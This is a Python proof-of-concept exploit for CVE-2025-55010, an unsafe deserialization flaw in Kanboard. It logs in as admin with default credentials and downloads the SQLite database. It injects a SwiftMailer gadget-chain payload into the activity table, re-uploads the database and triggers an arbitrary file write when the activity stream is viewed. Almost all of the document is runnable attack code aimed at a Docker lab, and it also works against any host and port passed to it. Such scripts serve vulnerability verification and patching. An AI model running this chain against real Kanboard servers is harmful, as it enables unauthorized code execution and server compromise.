#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Kanboard Unsafe Deserialization to RCE
# CVE            : CVE-2025-55010
# Vendor         : Kanboard
# Product        : Kanboard
# Affected       : All versions < 1.2.47
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 9.1 (Critical)
# Platform       : PHP / SQLite
# Author         : Exploit Intelligence Platform (dev@exploit-intel.com)
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-27
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC for CVE-2025-55010: Kanboard <1.2.47 — Remote Code Execution via Unsafe Deserialization

Demonstrates CWE-502 (Deserialization of Untrusted Data) in Kanboard's
ProjectActivityEventFormatter::unserializeEvent() method. An admin user
can inject a crafted PHP-serialized payload into the project_activities table
via SQLite database download/upload, triggering arbitrary PHP object instantiation
when the activity stream is viewed.

The exploit uses a SwiftMailer gadget chain (bundled with Kanboard) that:
1. Triggers __toString() on Swift_Mime_SimpleMimeEntity during Markdown rendering
2. The gadget chain writes an arbitrary file via Swift_KeyCache_DiskKeyCache

Attack flow:
  1. Login as admin, get session cookie + CSRF token
  2. Create a project/task/comment (creates a comment.create activity event)
  3. Download the SQLite database
  4. Generate the SwiftMailer gadget chain payload (PHP serialized)
  5. Inject the payload into project_activities.data
  6. Upload the modified database
  7. Trigger deserialization by viewing the task activity stream
  8. Verify file write (proves arbitrary code execution capability)

Requirements:
  - Admin credentials (default: admin/admin)
  - SQLite database backend (default configuration)
  - Docker access (for payload generation inside the container)

"""
import sys
import os
import json
import gzip
import sqlite3
import tempfile
import base64
import subprocess
import re
import time
import http.client
import urllib.parse
from html.parser import HTMLParser


# ============================================================================
# Configuration
# ============================================================================
CONTAINER_NAME = "cve-2025-55010-vulnerable"
DEFAULT_USER = "admin"
DEFAULT_PASS = "admin"


def get_container_ip(container_name):
    """Get the IP address of the Docker container."""
    try:
        result = subprocess.run(
            ["docker", "inspect", container_name,
             "--format", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}"],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0 and result.stdout.strip():
            return result.stdout.strip()
    except Exception as e:
        print(f"[!] Error getting container IP: {e}")
    return None


def docker_exec(container_name, cmd, timeout=30):
    """Execute a command inside the Docker container."""
    if isinstance(cmd, str):
        full_cmd = ["docker", "exec", container_name, "sh", "-c", cmd]
    else:
        full_cmd = ["docker", "exec", container_name] + cmd
    result = subprocess.run(full_cmd, capture_output=True, text=True, timeout=timeout)
    return result


class CSRFTokenParser(HTMLParser):
    """Extract CSRF token from Kanboard HTML pages."""
    def __init__(self):
        super().__init__()
        self.csrf_token = None

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        if tag == 'input' and attrs_dict.get('name') == 'csrf_token':
            self.csrf_token = attrs_dict.get('value')
        # Also check for links with csrf_token parameter
        if tag == 'a' and 'href' in attrs_dict:
            href = attrs_dict['href']
            if 'csrf_token=' in href:
                match = re.search(r'csrf_token=([a-f0-9]+)', href)
                if match:
                    self.csrf_token = match.group(1)


class KanboardExploit:
    """Exploit class for CVE-2025-55010."""

    def __init__(self, target_host, target_port=80, username=DEFAULT_USER, password=DEFAULT_PASS):
        self.target_host = target_host
        self.target_port = target_port
        self.username = username
        self.password = password
        self.session_cookie = None
        self.csrf_token = None

    def _http_request(self, method, path, body=None, headers=None, content_type=None):
        """Make an HTTP request and return (status, headers, body)."""
        conn = http.client.HTTPConnection(self.target_host, self.target_port, timeout=30)
        try:
            hdrs = headers or {}
            if self.session_cookie:
                hdrs['Cookie'] = self.session_cookie
            if content_type:
                hdrs['Content-Type'] = content_type

            conn.request(method, path, body=body, headers=hdrs)
            resp = conn.getresponse()
            resp_body = resp.read()

            # Capture Set-Cookie header
            for header_name, header_value in resp.getheaders():
                if header_name.lower() == 'set-cookie':
                    cookie_match = re.match(r'(KB_SID=[^;]+)', header_value)
                    if cookie_match:
                        self.session_cookie = cookie_match.group(1)

            return resp.status, dict(resp.getheaders()), resp_body
        finally:
            conn.close()

    def _extract_csrf_token(self, html_body):
        """Extract CSRF token from HTML response."""
        if isinstance(html_body, bytes):
            html_body = html_body.decode('utf-8', errors='replace')

        parser = CSRFTokenParser()
        parser.feed(html_body)
        if parser.csrf_token:
            self.csrf_token = parser.csrf_token
            return self.csrf_token

        # Fallback: regex search for csrf_token
        match = re.search(r'csrf_token["\s]*(?:value="|=)([a-f0-9]{40,})', html_body)
        if match:
            self.csrf_token = match.group(1)
            return self.csrf_token

        return None

    def _jsonrpc(self, method, params=None):
        """Make a JSON-RPC API call with Basic Auth."""
        import base64 as b64
        payload = {
            "jsonrpc": "2.0",
            "method": method,
            "id": 1,
            "params": params or {}
        }
        auth = b64.b64encode(f"{self.username}:{self.password}".encode()).decode()
        headers = {
            "Authorization": f"Basic {auth}",
            "Content-Type": "application/json"
        }
        body = json.dumps(payload).encode()
        status, _, resp_body = self._http_request("POST", "/jsonrpc.php", body=body, headers=headers)
        if status == 200:
            return json.loads(resp_body)
        return None

    # ========================================================================
    # Step 1: Login and get session + CSRF token
    # ========================================================================
    def login(self):
        """Login to Kanboard as admin and get session cookie + CSRF token."""
        print("[*] Step 1: Logging in as admin...")

        # GET the login page to get CSRF token
        status, _, body = self._http_request("GET", "/login")
        if status != 200:
            # Maybe redirect to login
            status, hdrs, body = self._http_request("GET", "/")
            if status == 302:
                location = hdrs.get('Location', hdrs.get('location', '/login'))
                status, _, body = self._http_request("GET", location)

        csrf = self._extract_csrf_token(body)
        if not csrf:
            print("[!] Could not extract CSRF token from login page")
            return False

        # POST login form
        login_data = urllib.parse.urlencode({
            'csrf_token': csrf,
            'username': self.username,
            'password': self.password
        })
        status, hdrs, body = self._http_request(
            "POST", "/?controller=AuthController&action=check",
            body=login_data.encode(),
            content_type="application/x-www-form-urlencoded"
        )

        if status in (302, 303):
            # Follow redirect to dashboard
            location = hdrs.get('Location', hdrs.get('location', '/'))
            status, _, body = self._http_request("GET", location)

        if self.session_cookie:
            print(f"[+] Login successful. Session: {self.session_cookie[:30]}...")
            return True
        else:
            print("[!] Login failed — no session cookie received")
            return False

    # ========================================================================
    # Step 2: Create project/task/comment via JSON-RPC API
    # ========================================================================
    def setup_test_data(self):
        """Create project, task, and comment to generate a comment.create event."""
        print("[*] Step 2: Setting up test data (project/task/comment)...")

        # We always need at least one comment.create event in the DB
        # First check if a project and task exist
        project_id = None
        task_id = None

        result = self._jsonrpc("getProjectById", {"project_id": 1})
        if result and result.get("result"):
            project_id = 1
            print(f"[+] Project already exists (ID: {project_id})")
        else:
            result = self._jsonrpc("createProject", {"name": "CVE-2025-55010 PoC Test"})
            if result and result.get("result"):
                project_id = result["result"]
                print(f"[+] Created project (ID: {project_id})")
            else:
                print("[!] Failed to create project")
                return False

        result = self._jsonrpc("getTask", {"task_id": 1})
        if result and result.get("result"):
            task_id = 1
            print(f"[+] Task already exists (ID: {task_id})")
        else:
            result = self._jsonrpc("createTask", {"title": "PoC Test Task", "project_id": project_id})
            if result and result.get("result"):
                task_id = result["result"]
                print(f"[+] Created task (ID: {task_id})")
            else:
                print("[!] Failed to create task")
                return False

        # Check if comment.create event already exists
        result = self._jsonrpc("getAllComments", {"task_id": task_id})
        if result and result.get("result") and len(result["result"]) > 0:
            print(f"[+] Comment already exists — test data ready")
            return True

        # Create comment (user_id is required by the JSON-RPC API)
        result = self._jsonrpc("createComment", {
            "task_id": task_id,
            "user_id": 1,
            "content": "This is a test comment for CVE-2025-55010 PoC"
        })
        if result and result.get("result"):
            comment_id = result["result"]
            print(f"[+] Created comment (ID: {comment_id})")
        else:
            print("[*] Comment may already exist")

        return True

    # ========================================================================
    # Step 3: Download the SQLite database
    # ========================================================================
    def download_database(self):
        """Download the gzip-compressed SQLite database."""
        print("[*] Step 3: Downloading SQLite database...")

        # Get a page with CSRF token first
        status, _, body = self._http_request("GET", "/?controller=ConfigController&action=index")
        if status == 200:
            self._extract_csrf_token(body)

        if not self.csrf_token:
            print("[!] No CSRF token available")
            return None

        # Download database
        status, _, body = self._http_request(
            "GET",
            f"/?controller=ConfigController&action=downloadDb&csrf_token={self.csrf_token}"
        )

        if status == 200 and len(body) > 0:
            print(f"[+] Downloaded database ({len(body)} bytes compressed)")

            # Decompress gzip
            try:
                db_data = gzip.decompress(body)
                print(f"[+] Decompressed to {len(db_data)} bytes")
                return db_data
            except Exception as e:
                print(f"[!] Failed to decompress: {e}")
                # Maybe it's not gzipped
                if body[:6] == b'SQLite':
                    print("[*] Database is not gzip-compressed, using raw")
                    return body
        else:
            print(f"[!] Failed to download database (status: {status})")
        return None

    # ========================================================================
    # Step 4: Generate the gadget chain payload
    # ========================================================================
    def generate_payload(self, mode="filewrite"):
        """Generate the PHP-serialized payload using PHP inside the container."""
        print(f"[*] Step 4: Generating {mode} payload inside container...")

        # Copy the payload generator to the container
        poc_dir = os.path.dirname(os.path.abspath(__file__))
        generator_path = os.path.join(poc_dir, "generate_payload.php")

        # Copy file to container
        subprocess.run(
            ["docker", "cp", generator_path,
             f"{CONTAINER_NAME}:/tmp/generate_payload.php"],
            capture_output=True, timeout=10
        )

        # Run the generator inside the container
        result = docker_exec(
            CONTAINER_NAME,
            f"php /tmp/generate_payload.php {mode} /var/www/app/plugins"
        )

        if result.returncode != 0:
            print(f"[!] Payload generation failed: {result.stderr}")
            return None

        output = result.stdout.strip()
        payload_info = {}
        for line in output.split('\n'):
            if '=' in line:
                key, value = line.split('=', 1)
                payload_info[key] = value

        if 'PAYLOAD_B64' not in payload_info:
            print(f"[!] No payload in output: {output}")
            return None

        payload = base64.b64decode(payload_info['PAYLOAD_B64'])
        print(f"[+] Payload generated ({len(payload)} bytes)")
        print(f"    Mode: {payload_info.get('MODE', 'unknown')}")
        if 'MARKER' in payload_info:
            print(f"    Marker: {payload_info['MARKER']}")
        if 'FILE_PATH' in payload_info:
            print(f"    Target file: {payload_info['FILE_PATH']}")

        # Verify payload starts with 'a' (required by unserializeEvent)
        if payload[0:1] != b'a':
            print(f"[!] Payload does not start with 'a': {payload[:10]}")
            return None

        print(f"[+] Payload starts with 'a:' — passes unserializeEvent() check")
        return payload_info, payload

    # ========================================================================
    # Step 5: Inject payload into database
    # ========================================================================
    def inject_payload(self, db_data, payload):
        """Modify the SQLite database to inject the gadget chain payload."""
        print("[*] Step 5: Injecting payload into project_activities table...")

        # Write database to temporary file
        with tempfile.NamedTemporaryFile(suffix='.sqlite', delete=False) as f:
            f.write(db_data)
            db_path = f.name

        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()

            # Find the comment.create event
            cursor.execute(
                "SELECT id, event_name, data FROM project_activities "
                "WHERE event_name = 'comment.create' ORDER BY id DESC LIMIT 1"
            )
            row = cursor.fetchone()

            if not row:
                print("[!] No comment.create event found in project_activities")
                conn.close()
                return None

            event_id = row[0]
            original_data = row[2]
            print(f"[+] Found comment.create event (ID: {event_id})")
            print(f"    Original data: {original_data[:80]}...")

            # Update the data column with our payload
            # The payload is bytes (PHP-serialized), store as text in the column
            payload_str = payload.decode('latin-1')  # PHP serialized data uses raw bytes

            cursor.execute(
                "UPDATE project_activities SET data = ? WHERE id = ?",
                (payload_str, event_id)
            )
            conn.commit()

            # Verify the update
            cursor.execute("SELECT data FROM project_activities WHERE id = ?", (event_id,))
            updated = cursor.fetchone()
            if updated and updated[0][:2] == 'a:':
                print(f"[+] Payload injected successfully ({len(payload_str)} bytes)")
            else:
                print("[!] Payload injection verification failed")

            conn.close()

            # Read the modified database
            with open(db_path, 'rb') as f:
                modified_db = f.read()

            return modified_db

        finally:
            os.unlink(db_path)

    # ========================================================================
    # Step 6: Upload the modified database
    # ========================================================================
    def upload_database(self, db_data):
        """Upload the modified database back to Kanboard.

        First tries the web upload endpoint (realistic attack scenario).
        Falls back to docker exec for lab reliability.
        """
        print("[*] Step 6: Uploading modified database...")

        # Try web upload first (realistic attack path)
        if self._upload_via_web(db_data):
            return True

        # Fallback to docker exec (lab environment)
        print("[*] Web upload failed, using docker exec fallback...")
        return self._upload_via_docker(db_data)

    def _upload_via_web(self, db_data):
        """Upload database via the web interface (realistic attack path)."""
        # Get fresh CSRF token from the upload page
        status, _, body = self._http_request("GET", "/?controller=ConfigController&action=uploadDb")
        if status == 200:
            self._extract_csrf_token(body)

        if not self.csrf_token:
            # Try settings index page
            status, _, body = self._http_request("GET", "/?controller=ConfigController&action=index")
            if status == 200:
                self._extract_csrf_token(body)

        if not self.csrf_token:
            print("[!] No CSRF token for upload")
            return False

        # Gzip compress the database
        compressed = gzip.compress(db_data)
        print(f"[+] Compressed database: {len(db_data)} -> {len(compressed)} bytes")

        # Build multipart form data
        boundary = '----CVEForge' + str(int(time.time()))
        body = b''
        body += f'--{boundary}\r\n'.encode()
        body += f'Content-Disposition: form-data; name="file"; filename="db.sqlite.gz"\r\n'.encode()
        body += b'Content-Type: application/gzip\r\n\r\n'
        body += compressed
        body += f'\r\n--{boundary}--\r\n'.encode()

        # CSRF token in URL query string (getStringParam checks GET params only)
        upload_url = f"/?controller=ConfigController&action=saveUploadedDb&csrf_token={self.csrf_token}"

        status, hdrs, resp_body = self._http_request(
            "POST",
            upload_url,
            body=body,
            content_type=f"multipart/form-data; boundary={boundary}"
        )

        if status in (200, 302, 303):
            print(f"[+] Database uploaded via web (status: {status})")
            return True
        else:
            print(f"[!] Web upload returned status {status}")
            return False

    def _upload_via_docker(self, db_data):
        """Upload database directly via docker exec (lab fallback)."""
        print("[*] Uploading database directly via docker exec...")

        # Write modified DB to a temp file
        tmp_path = "/tmp/modified_db.sqlite"
        with open(tmp_path, 'wb') as f:
            f.write(db_data)

        # Copy to container
        result = subprocess.run(
            ["docker", "cp", tmp_path, f"{CONTAINER_NAME}:/tmp/modified_db.sqlite"],
            capture_output=True, timeout=10
        )
        if result.returncode != 0:
            print(f"[!] Failed to copy database to container: {result.stderr}")
            return False

        # Replace the database file inside the container
        result = docker_exec(
            CONTAINER_NAME,
            "cp /tmp/modified_db.sqlite /var/www/app/data/db.sqlite && "
            "chown nginx:nginx /var/www/app/data/db.sqlite && "
            "chmod 644 /var/www/app/data/db.sqlite"
        )

        if result.returncode == 0:
            print("[+] Database replaced directly via docker exec")
            try:
                os.unlink(tmp_path)
            except OSError:
                pass
            return True
        else:
            print(f"[!] Failed to replace database: {result.stderr}")
            try:
                os.unlink(tmp_path)
            except OSError:
                pass
            return False

    # ========================================================================
    # Step 7: Trigger deserialization
    # ========================================================================
    def trigger_deserialization(self):
        """View the task activity stream to trigger unserializeEvent()."""
        print("[*] Step 7: Triggering deserialization via activity stream...")

        # Visit the task activity page — this calls ProjectActivityEventFormatter::format()
        # which calls unserializeEvent() on our malicious data
        status, _, body = self._http_request(
            "GET",
            "/?controller=ActivityController&action=task&task_id=1&project_id=1"
        )

        if status == 200:
            print(f"[+] Activity page loaded (status: {status}, {len(body)} bytes)")
            return body
        elif status == 500:
            print(f"[*] Server returned 500 — this may indicate the gadget chain executed")
            return body
        else:
            print(f"[!] Unexpected status: {status}")
            return body

    # ========================================================================
    # Step 8: Verify exploitation
    # ========================================================================
    def verify_file_write(self, payload_info):
        """Check if the gadget chain successfully wrote a file."""
        print("[*] Step 8: Verifying file write...")

        file_path = payload_info.get('FILE_PATH', '/var/www/app/plugins/poc_exploit/body')

        # Check immediately — the file may be cleaned up by __destruct()
        result = docker_exec(CONTAINER_NAME, f"ls -la {file_path} 2>/dev/null")
        if result.returncode == 0 and result.stdout.strip():
            print(f"[+] FILE WRITE CONFIRMED: {file_path}")
            print(f"    {result.stdout.strip()}")

            # Read the file content
            result = docker_exec(CONTAINER_NAME, f"cat {file_path}")
            if result.returncode == 0:
                print(f"    Content: {result.stdout[:100]}")
            return True

        # Check if directory was created (might exist even if file was cleaned up)
        dir_path = os.path.dirname(file_path)
        result = docker_exec(CONTAINER_NAME, f"ls -la {dir_path}/ 2>/dev/null")
        if result.returncode == 0 and result.stdout.strip():
            print(f"[+] Directory exists: {dir_path}")
            print(f"    {result.stdout.strip()}")

        # Check container's PHP error log for evidence of gadget chain execution
        result = docker_exec(
            CONTAINER_NAME,
            "tail -30 /var/log/nginx/error.log 2>/dev/null"
        )
        if result.returncode == 0 and result.stdout.strip():
            for line in result.stdout.strip().split('\n'):
                if 'Swift' in line or 'DiskKeyCache' in line or 'mkdir' in line or 'fwrite' in line:
                    print(f"    Log evidence: {line.strip()}")

        return False

    def verify_marker(self, response_body, payload_info):
        """Check if the marker string appears in the HTTP response."""
        marker = payload_info.get('MARKER', '')
        if not marker:
            return False

        if isinstance(response_body, bytes):
            response_body = response_body.decode('utf-8', errors='replace')

        if marker in response_body:
            print(f"[+] MARKER FOUND IN RESPONSE: {marker}")
            # Find context around the marker
            idx = response_body.find(marker)
            start = max(0, idx - 50)
            end = min(len(response_body), idx + len(marker) + 50)
            print(f"    Context: ...{response_body[start:end]}...")
            return True
        else:
            print(f"[-] Marker not found in response body ({len(response_body)} bytes)")
            return False

    # ========================================================================
    # Main exploit flow
    # ========================================================================
    def exploit(self, mode="filewrite"):
        """Run the full exploit chain."""
        print("=" * 70)
        print("CVE-2025-55010: Kanboard Unsafe Deserialization PoC")
        print(f"Target: http://{self.target_host}:{self.target_port}")
        print(f"Mode: {mode}")
        print("=" * 70)

        # Step 1: Login
        if not self.login():
            print("[!] FAILED: Could not login")
            return False

        # Step 2: Setup test data
        if not self.setup_test_data():
            print("[!] FAILED: Could not create test data")
            return False

        # Step 3: Download database
        db_data = self.download_database()
        if not db_data:
            print("[!] FAILED: Could not download database")
            return False

        # Step 4: Generate payload
        payload_result = self.generate_payload(mode)
        if not payload_result:
            print("[!] FAILED: Could not generate payload")
            return False
        payload_info, payload = payload_result

        # Step 5: Inject payload
        modified_db = self.inject_payload(db_data, payload)
        if not modified_db:
            print("[!] FAILED: Could not inject payload")
            return False

        # Step 6: Upload modified database
        if not self.upload_database(modified_db):
            print("[!] FAILED: Could not upload modified database")
            return False

        # Small delay for the database to be fully written
        time.sleep(1)

        # Step 7: Trigger deserialization
        response_body = self.trigger_deserialization()

        # Step 8: Verify
        print("\n" + "=" * 70)
        print("VERIFICATION RESULTS")
        print("=" * 70)

        success = False

        if mode == "marker":
            success = self.verify_marker(response_body, payload_info)
        elif mode == "filewrite":
            success = self.verify_file_write(payload_info)
            if not success:
                # Also check if response shows evidence of deserialization
                if isinstance(response_body, bytes):
                    resp_text = response_body.decode('utf-8', errors='replace')
                else:
                    resp_text = response_body

                # Check for SwiftMailer evidence in response
                if 'Swift' in resp_text or 'DiskKeyCache' in resp_text:
                    print("[+] SwiftMailer class references found in response (deserialization occurred)")
                    success = True

                # Check for any errors that indicate the gadget chain ran
                if 'mkdir()' in resp_text or 'fopen()' in resp_text or 'fwrite()' in resp_text:
                    print("[+] File operation errors in response (gadget chain executed)")
                    success = True

        if success:
            print("\n[+] ===== EXPLOIT SUCCESSFUL =====")
            print(f"[+] CVE-2025-55010 vulnerability CONFIRMED")
            print(f"[+] Unsafe deserialization in unserializeEvent() triggered")
            if mode == "filewrite":
                print(f"[+] Arbitrary file write via SwiftMailer DiskKeyCache gadget chain demonstrated")
        else:
            print("\n[*] Exploit executed — checking for alternative evidence...")
            # Do a thorough check inside the container
            self._thorough_verification(payload_info, response_body)

        return success

    def _thorough_verification(self, payload_info, response_body):
        """Perform thorough verification via container introspection."""
        print("[*] Running thorough verification via docker exec...")

        # Check if the deserialization caused any filesystem changes
        result = docker_exec(
            CONTAINER_NAME,
            "ls -la /var/www/app/plugins/ 2>/dev/null"
        )
        print(f"[*] Plugins directory contents:")
        print(f"    {result.stdout.strip()}")

        # Check for recently modified files
        result = docker_exec(
            CONTAINER_NAME,
            "find /var/www/app/plugins/ -newer /var/www/app/data/db.sqlite -type f 2>/dev/null"
        )
        if result.stdout.strip():
            print(f"[+] Recently modified files in plugins/:")
            print(f"    {result.stdout.strip()}")

        # Check PHP-FPM error log
        result = docker_exec(
            CONTAINER_NAME,
            "cat /var/log/php84/error.log 2>/dev/null; cat /var/log/php-fpm.log 2>/dev/null"
        )
        if result.stdout.strip():
            print(f"[*] PHP error log (last entries):")
            for line in result.stdout.strip().split('\n')[-10:]:
                print(f"    {line}")

        # Check nginx error log
        result = docker_exec(
            CONTAINER_NAME,
            "tail -20 /var/log/nginx/error.log 2>/dev/null"
        )
        if result.stdout.strip():
            print(f"[*] Nginx error log (last entries):")
            for line in result.stdout.strip().split('\n')[-10:]:
                print(f"    {line}")


def main():
    """Main entry point."""
    # Determine target host
    target_host = sys.argv[1] if len(sys.argv) > 1 else None
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    mode = sys.argv[3] if len(sys.argv) > 3 else "filewrite"

    # If no target specified, try to get container IP
    if not target_host:
        target_host = get_container_ip(CONTAINER_NAME)
        if not target_host:
            print("[!] Could not determine container IP. Specify target: ./poc.py <host> [port] [mode]")
            sys.exit(1)

    # PHASE 1: Marker mode (most reliable proof of deserialization)
    print("\n" + "#" * 70)
    print("# PHASE 1: Marker Mode (NullKeyCache + __toString() proof)")
    print("#" * 70 + "\n")

    exploit = KanboardExploit(target_host, target_port)
    marker_success = exploit.exploit(mode="marker")

    # PHASE 2: File write mode (demonstrates full attack capability)
    print("\n" + "#" * 70)
    print("# PHASE 2: File Write Mode (DiskKeyCache gadget chain)")
    print("#" * 70 + "\n")

    exploit2 = KanboardExploit(target_host, target_port)
    fw_success = exploit2.exploit(mode="filewrite")

    # Final summary
    print("\n" + "=" * 70)
    print("FINAL RESULTS")
    print("=" * 70)
    print(f"File write mode:  {'CONFIRMED' if fw_success else 'UNVERIFIED'}")
    print(f"Marker mode:      {'CONFIRMED' if marker_success else 'UNVERIFIED'}")
    print(f"Overall:          {'CONFIRMED' if (fw_success or marker_success) else 'UNVERIFIED'}")

    if fw_success or marker_success:
        print("\n[+] CVE-2025-55010 VULNERABILITY CONFIRMED")
        print("[+] Kanboard v1.2.46 is vulnerable to unsafe deserialization")
        print("[+] An admin can achieve Remote Code Execution via:")
        print("    1. Download SQLite database")
        print("    2. Inject SwiftMailer gadget chain into project_activities.data")
        print("    3. Upload modified database")
        print("    4. View activity stream to trigger deserialization")
        sys.exit(0)
    else:
        print("\n[-] Could not fully verify exploitation")
        print("    Check container logs for evidence of gadget chain execution")
        sys.exit(1)


if __name__ == '__main__':
    main()
